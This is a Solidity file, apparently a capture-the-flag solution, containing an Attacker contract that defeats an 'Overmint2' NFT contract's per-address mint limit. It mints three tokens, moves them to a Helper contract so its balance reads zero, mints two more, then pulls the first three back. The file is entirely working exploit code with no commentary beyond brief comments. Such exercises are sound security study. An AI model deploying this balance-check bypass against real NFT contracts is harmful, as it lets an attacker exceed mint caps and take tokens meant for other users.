// SPDX-License-Identifier: MIT

pragma solidity 0.8.28;

import {IERC721} from "@openzeppelin-contracts-5.1.0/token/ERC721/IERC721.sol";
import {IERC721Receiver} from "@openzeppelin-contracts-5.1.0/interfaces/IERC721Receiver.sol";

interface Overmint2 is IERC721 {
    function mint() external;
}

contract Helper {
    address boss;

    constructor(address address_) {
        boss = address_;
    }

    function transferBack(address nftAddress, uint256 tokenId) external {
        IERC721(nftAddress).transferFrom(address(this), boss, tokenId);
    }
}

contract Attacker {
    Overmint2 victim;
    Helper private immutable helper;

    constructor(address address_) {
        victim = Overmint2(address_);
        helper = new Helper(address(this));
    }

    function attack() external {
        // First mint 3 NFTs

        victim.mint();
        victim.mint();
        victim.mint();

        // Transfer them to helper
        for (uint256 i = 1; i <= 3; i++) {
            victim.transferFrom(address(this), address(helper), i);
        }

        // Mint 2 more since our balance is now 0
        victim.mint();
        victim.mint();

        // Get back the first 3 NFTs
        for (uint256 i = 1; i <= 3; i++) {
            helper.transferBack(address(victim), i);
        }
    }
}

contract Collaborator {}
